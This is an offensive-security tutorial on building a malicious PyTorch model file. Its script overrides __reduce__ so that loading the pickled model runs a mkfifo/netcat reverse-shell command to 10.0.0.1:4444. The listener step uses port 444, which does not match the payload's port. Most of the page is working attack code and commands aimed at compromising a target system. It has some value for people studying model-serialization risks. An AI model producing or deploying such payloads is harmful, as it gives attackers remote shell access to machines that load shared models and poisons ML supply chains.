# Create Malicious ML Model

## Create Malicious ML Model <a href="#create-malicious-ml-model" id="create-malicious-ml-model"></a>

### Model Serialization Attack <a href="#model-serialization-attack" id="model-serialization-attack"></a>

This technique abuses the **Pickle**'s vulnerability to code execution when loading a model.\
We may execute arbitrary command in target system.

#### 1. Install Dependencies <a href="#id-1-install-dependencies" id="id-1-install-dependencies"></a>

It requires `torch` so install it:

```shellscript
# Create a virtual environment to avoid pulluting the host environment.
python3 -m venv myvenv
pip3 install torch
```

#### 2. Create Python Script To Generate Malicious Model <a href="#id-2-create-python-script-to-generate-malicious-model" id="id-2-create-python-script-to-generate-malicious-model"></a>

Now create a Python script that generates our malicious ML model. This model executes OS command when it is evaluated.

```shellscript
# generate_model.py
import torch
import torch.nn as nn
import os

class EvilModel(nn.Module):
    def __init__(self):
        super(EvilModel, self).__init__()
        self.dense = nn.Linear(10, 50)

    def forward(self, evil):
        return self.dense(evil)

    def __reduce__(self):
        # Inject OS command.
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f"
        return os.system, (cmd,)

# Save the model
evil_model = EvilModel()
torch.save(evil_model, 'evil.pth')
```

#### 3. Run Python Script <a href="#id-3-run-python-script" id="id-3-run-python-script"></a>

Now execute this Python script as below:

```shellscript
python3 generate_model.py
```

After that, our model named `evil.pth` will be generated.

#### 4. Compromise Target System using the Model <a href="#id-4-compromise-target-system-using-the-model" id="id-4-compromise-target-system-using-the-model"></a>

If our malicious model is loaded/trained/evaluated in the target system, the OS command is executed and we can get reverse shell, so we need to wait for incoming connection by staring a listener in attack machine:

```shellscript
nc -lvnp 444
```
